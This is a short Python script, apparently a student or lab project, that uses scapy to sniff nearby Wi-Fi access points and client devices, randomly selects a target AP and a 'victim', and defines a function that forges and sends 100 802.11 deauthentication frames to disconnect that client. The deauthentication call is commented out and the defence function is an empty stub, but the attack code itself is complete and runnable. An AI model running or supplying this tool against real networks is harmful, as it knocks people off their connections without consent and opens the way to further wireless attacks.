from scapy.all import *
import os
import sys
import sys
import time
import random
import change_modes as modes


# Global Variables
with open("iface_name.txt", 'r') as file:
    iface = file.readline()

ap_list = list()
ssid_list = list()
users = list()


def AP_handler(pkt):
    global ap_list
    # Checking if the packets have a 802.11 layer
    if pkt.haslayer(Dot11):
        network = pkt.getlayer(Dot11)
        if network.addr2 and network.addr2 not in ap_list and network.payload.name != "NoPayload":
            ap_list.append(network.addr2)
            ssid_list.append(network.payload.name)
            print(f"{len(ap_list)}\t{ network.addr2}\t{network.payload.name}")


def users_handler(pkt):
    global users
    if pkt.addr2 not in ap_list and pkt.addr2 not in users and pkt.addr2 != "00:00:00:00:00:00":
        users.append(pkt.addr2)
        print(f"{len(users)}\t{pkt.addr2}")


def scan_wlan():
    print("\n\nScanning for access points...")
    print("Index\tMAC\t\t\tSSID")
    sniff(iface=iface, count=0, prn=AP_handler, timeout=10)


def scan_for_users():
    print("\n\nScanning for users...")
    print("Index\tUser MAC")
    sniff(iface=iface, prn=users_handler, timeout=10)


def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
    # 802.11 frame
    # addr1: destination MAC , addr2: source MAC,  addr3: Access Point MAC
    dot11 = Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)


def network_attack():
    scan_wlan()

    print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
    try:
        random_ap = random.choice(ap_list)
    except:
        print("List of Access Points is empty!")
        random_ap = "No AP found"
    print(f"\nRandom chosen AP is: {random_ap}")

    scan_for_users()

    try:
        victim = random.choice(users)
    except:
        print("List of users is empty!")
        victim = "No user found to attack!"
    print(f"\nRandom chosen victm is: {victim}")

    #victim = "c0:e8:62:82:aa:dd"
    #ap_mac_addr = "B4:EE:B4:A8:91:13"
    #deauthenticate_victim(iface, victim, ap_mac_addr)


def defense_attack():
    pass


def main():
    network_attack()
    # defense_attack()


if __name__ == "__main__":
    main()
